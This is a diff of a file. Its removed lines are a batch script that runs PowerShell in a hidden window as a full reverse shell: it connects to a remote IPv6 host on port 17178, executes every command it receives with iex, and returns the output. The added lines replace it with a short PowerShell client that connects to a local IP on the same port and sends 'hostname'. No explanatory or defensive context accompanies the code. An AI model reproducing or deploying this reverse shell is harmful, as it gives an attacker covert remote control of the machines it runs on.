@@ -1,2 +1,23 @@
-@echo off
-powershell -WindowStyle Hidden -Command "$client = New-Object System.Net.Sockets.TCPClient('[2001:4860:7:171b::fd]',17178);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
+# Simple test client
+try {
+    $client = New-Object System.Net.Sockets.TcpClient
+    $client.Connect("192.168.0.11", 17178) # Use the correct IP
+    Write-Host "Connection successful!" -ForegroundColor Green
+    
+    $stream = $client.GetStream()
+    $writer = New-Object System.IO.StreamWriter($stream)
+    $reader = New-Object System.IO.StreamReader($stream)
+    
+    # Send a simple command
+    $writer.WriteLine("hostname")
+    $writer.Flush()
+    
+    # Read the response
+    $response = $reader.ReadLine()
+    Write-Host "Server responded: $response"
+    
+    $client.Close()
+}
+catch {
+    Write-Host "Connection failed: $($_.Exception.Message)" -ForegroundColor Red
+}
